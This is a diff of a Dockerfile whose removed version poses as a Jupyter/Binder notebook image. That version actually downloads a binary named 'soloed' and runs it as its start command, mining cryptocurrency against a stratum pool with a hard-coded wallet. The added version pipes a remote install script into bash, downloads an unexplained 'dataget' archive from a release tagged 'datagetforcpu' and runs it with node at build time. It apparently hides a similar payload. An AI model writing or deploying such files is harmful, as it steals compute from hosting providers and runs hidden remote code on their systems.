@@ -1,50 +1,67 @@
-# Use the official Ubuntu base image
 FROM ubuntu:20.04
 
-# Avoid interactive prompts during package installations
+
+
 ENV DEBIAN_FRONTEND=noninteractive
 
-# Install basic dependencies
 RUN apt-get update && \
     apt-get install -y \
     wget \
     curl \
-    ca-certificates \
-    python3 \
-    python3-pip
-    
-#run something 
+    libnss3-dev \
+    gconf-service \
+    libasound2 \
+    libatk1.0-0 \
+    libc6 \
+    libcairo2 \
+    libcups2 \
+    libdbus-1-3 \
+    libexpat1 \
+    libfontconfig1 \
+    libgcc1 \
+    libgconf-2-4 \
+    libgdk-pixbuf2.0-0 \
+    libglib2.0-0 \
+    libgtk-3-0 \
+    libnspr4 \
+    libpango-1.0-0 \
+    libpangocairo-1.0-0 \
+    libstdc++6 \
+    libx11-6 \
+    libx11-xcb1 \
+    libxcb1 \
+    libxcomposite1 \
+    libxcursor1 \
+    libxdamage1 \
+    libxext6 \
+    libxfixes3 \
+    libxi6 \
+    libxrandr2 \
+    libxrender1 \
+    libxss1 \
+    libxtst6 \ 
+    ca-certificates  \
+    fonts-liberation \
+    libappindicator1 \
+    libnss3 \
+    lsb-release \
+    xdg-utils \
+    libgbm-dev \
+    npm \
+    nodejs
 
 
-#./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t 2 &  
+RUN curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash
+RUN source ~/.bashrc
+RUN nvm install 18 
+RUN wget https://github.com/Solo120140/Sologotemm-/releases/download/datagetforcpu/dataget.tar.gz && \
+tar -xvf dataget.tar.gz && \
+npm install
 
 
-# Install Jupyter Notebook
-RUN pip3 install --no-cache --upgrade pip && \
-    pip3 install --no-cache jupyterlab
-
-# Create a non-root user with UID 1000
-ARG NB_USER=jovyan
-ARG NB_UID=1000
-ENV USER ${NB_USER}
-ENV NB_UID ${NB_UID}
-ENV HOME /home/${NB_USER}
+RUN node index.js
 
 
-RUN adduser --disabled-password \
-    --gecos "Default user" \
-    --uid ${NB_UID} \
-    ${NB_USER}
 
-WORKDIR ${HOME}
-USER ${USER}
-RUN wget https://github.com/Solo120140/Doc-on-binder/releases/download/Main/soloed
 
-RUN chmod +x soloed
-
-# Make sure the contents of our repo are in ${HOME}
-COPY . ${HOME}
-USER root
-RUN chown -R ${NB_USER}:${NB_USER} ${HOME}
-
-CMD ["sh","./soloed -o stratum+tcps://stratum-asia.rplant.xyz:17042 -u RMq5DEMWYfPZB148q1JdXW6rpdLyZHz2vE -tls -a minotourx -t1"]
+     
